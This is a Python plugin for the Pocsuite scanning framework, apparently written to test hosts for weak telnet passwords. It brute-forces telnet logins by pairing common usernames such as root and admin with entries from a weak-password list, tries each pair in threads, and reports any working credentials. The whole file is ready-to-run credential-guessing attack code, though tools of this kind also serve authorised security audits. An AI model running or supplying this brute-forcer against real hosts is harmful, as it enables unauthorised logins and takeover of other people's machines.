import itertools
import queue
import socket
import telnetlib
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import logger
from pocsuite.lib.core.data import paths
from pocsuite.lib.core.threads import runThreads

def get_ip_port(url):
    if url.startswith("http://"):
        url = url.strip("http://")
    if url.endswith("/"):
        url = url.strip("/")
    if ":" in url:
        url = url.split(":")
        ip = url[0]
        port = url[1]
        ip_port = [ip,port]
        return ip_port
    else:
        ip = url
        ip_port = [ip, 23]
        return ip_port


class DemoPOC(POCBase):
    vulID = '89687'
    version = '3'
    author = ['sxd']
    vulDate = '2020-03-17'
    createDate = '2020-03-17'
    updateDate = '2020-03-17'
    references = ['https://www.seebug.org/vuldb/ssvid-89687']
    name = 'Telnet 弱密码'
    appPowerLink = ''
    appName = 'telnet'
    appVersion = 'All'
    desc = '''telnet 存在弱密码，导致攻击者可登录主机进行恶意操作'''
    samples = ['']

    def _verify(self):
        result = {}
        ip_port=get_ip_port(self.url)
        host = ip_port[0]
        port = ip_port[1]

        telnet_burst(host, port)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


task_queue = queue.Queue()
result_queue = queue.Queue()


def get_word_list():
    common_username = ('Administrator', 'administrator', 'telnet',
                       'test', 'root', 'guest', 'admin', 'daemon', 'user')
    with open(paths.WEAK_PASS) as f:
        return itertools.product(common_username, f)


def port_check(host, port=23):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        return True
    else:
        s.close()
        return False


def telnet_login(host, port, username, password):
    ret = False
    key = [b'>', b'Login', b'login']
    tn = None
    try:
        for wrap in [b'\n', b'\r\n']:
            tn = telnetlib.Telnet()
            tn.open(host, port, timeout=6)
            tn.read_until(b'login: ', timeout=3)
            tn.write(username.encode() + wrap)
            if password:
                tn.read_until(b'password: ', timeout=3)
                tn.write(password.encode() + wrap)
            tmp = tn.expect(key, timeout=3)
            if b'>' in tmp[2]:
                ret = True
                break
    except Exception:
        pass
    finally:
        if tn:
            tn.close()
    return ret


def task_init(host, port):
    tmp = set()
    for username, password in get_word_list():
        if username not in tmp:
            task_queue.put((host, port, username.strip(), ''))
            tmp.add(username)
        task_queue.put((host, port, username.strip(), password.strip()))


def task_thread():
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, username, password))
        if telnet_login(host, port, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))


def telnet_burst(host, port):
    if not port_check(host, port):
        return

    try:
        task_init(host, port)
        runThreads(1, task_thread)
    except Exception:
        pass


register(DemoPOC)
